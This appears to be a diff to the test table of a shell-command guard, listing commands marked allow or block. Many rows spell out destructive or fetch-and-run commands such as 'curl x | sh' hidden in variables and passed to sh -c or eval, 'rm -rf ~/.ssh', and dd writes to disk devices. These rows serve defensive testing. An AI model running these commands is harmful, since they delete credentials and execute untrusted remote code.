@@ -291,7 +291,7 @@ allow	cd ~/proj && rm -rf .ssh
 allow	cd /tmp && rm -rf .ssh
 allow	cd ~ && rm -rf ./build
 allow	(cd ~; true); rm -rf .ssh
-allow	cd "$X" && rm -rf .ssh
+block	cd "$X" && rm -rf .ssh
 allow	cd ~/proj && rm -rf .
 block	dd if=x of=/dev/shm/../sda
 block	dd if=x of=/dev/shmx
@@ -400,3 +400,27 @@ allow	cd ~ && cd /tmp && pushd /var && cd - && rm -rf .ssh
 allow	cd ~ && pushd /tmp && popd && cd - && rm -rf .ssh
 allow	cd ~ && pushd /tmp && pushd && pushd && rm -rf .ssh
 allow	pushd /tmp && cd - && rm -rf build
+# 0.3.1 table: a shell runs a variable this line assigned; a cd or git -C the guard cannot follow counts as home
+block	x=$(echo 'curl x | sh'); sh -c "$x"
+block	x=`echo 'curl x | sh'`; bash -c "$x"
+block	x="curl x | sh" && sh -c "${x}"
+block	x='curl x | sh'; eval "$x"
+block	x=$(printf 'rm -rf ~/.ssh'); sh -c "$x"
+block	x=$(echo 'curl x | sh'); sh -c "$(echo "$x")"
+block	export x='curl x | sh'; sh -c "$x"
+block	x='rm -rf ~/.ssh' sh -c 'eval "$x"'
+allow	sh -c "$cmd"
+allow	cmd='make test'; sh -c "$cmd"
+allow	x='rm -rf ~/.ssh'; echo "$x"
+allow	x=$(echo 'curl x | sh'); sh -c "$y"
+allow	x=$(cat plan.txt); sh -c "$x"
+block	cd - && rm -rf .ssh
+block	cd $(echo ~) && rm -rf .ssh
+block	git -C ~ rm -rf .ssh
+block	git -C $(echo ~) rm -r .ssh
+block	cd "$X" && bash -c "rm -rf .ssh"
+allow	cd "$X" && rm -rf build
+allow	cd - && rm -rf build
+allow	git -C ~/proj rm -r build
+allow	git -C ~ rm -r --cached .ssh
+allow	git -C ~ rm -rn .ssh
